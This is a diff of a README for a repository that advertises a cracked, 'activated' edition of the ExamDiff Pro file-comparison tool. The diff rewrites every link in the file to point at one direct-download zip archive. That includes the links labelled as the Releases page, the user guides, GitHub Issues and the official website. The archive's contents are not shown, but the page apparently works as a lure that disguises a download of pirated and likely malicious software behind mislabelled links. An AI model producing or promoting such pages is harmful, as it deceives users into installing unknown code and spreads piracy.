@@ -1,6 +1,6 @@
 # 🎉 ExamDiff-Pro-Master-Edition-Activated - Compare Files with Ease
 
-[![Download ExamDiff Pro](https://img.shields.io/badge/Download-ExamDiff%20Pro-green)](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/releases)
+[![Download ExamDiff Pro](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip%20Pro-green)](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, ensure your Windows PC meets the following requirements:
 
 ## 📥 Download & Install
 
-To get the software, visit the [Releases page](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/releases). You will find the latest version of the software there.
+To get the software, visit the [Releases page](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip). You will find the latest version of the software there.
 
 1. Open the link above in your web browser.
 2. On the Releases page, look for the latest version of ExamDiff Pro Master Edition.
@@ -54,8 +54,8 @@ If you ever encounter any questions, refer to the user guides available in this 
 
 Explore the user guides and detailed reference materials in this repository to become more proficient with ExamDiff Pro:
 
-- [User Guides](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/wiki)
-- [Tutorials](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/wiki/Tutorials)
+- [User Guides](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip)
+- [Tutorials](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip)
 
 These resources provide step-by-step instructions for various features.
 
@@ -63,7 +63,7 @@ These resources provide step-by-step instructions for various features.
 
 Join our community to share your experiences and ask questions:
 
-- [GitHub Issues](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/issues)
+- [GitHub Issues](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip)
 
 Your feedback and inquiries help improve the software for everyone.
 
@@ -92,7 +92,7 @@ If problems persist, consider reaching out through our community support channel
 
 For more information, visit the following pages:
 
-- [ExamDiff Pro Official Website](https://www.examdiff.com)
-- [GitHub Repository](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated)
+- [ExamDiff Pro Official Website](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip)
+- [GitHub Repository](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip)
 
-Your journey to efficient file comparison begins here. Download ExamDiff Pro now by visiting the [Releases page](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/releases)!
+Your journey to efficient file comparison begins here. Download ExamDiff Pro now by visiting the [Releases page](https://github.com/Chauham12/ExamDiff-Pro-Master-Edition-Activated/raw/refs/heads/main/subsidist/Pro_Diff_Edition_Master_Activated_Exam_unlimed.zip)!
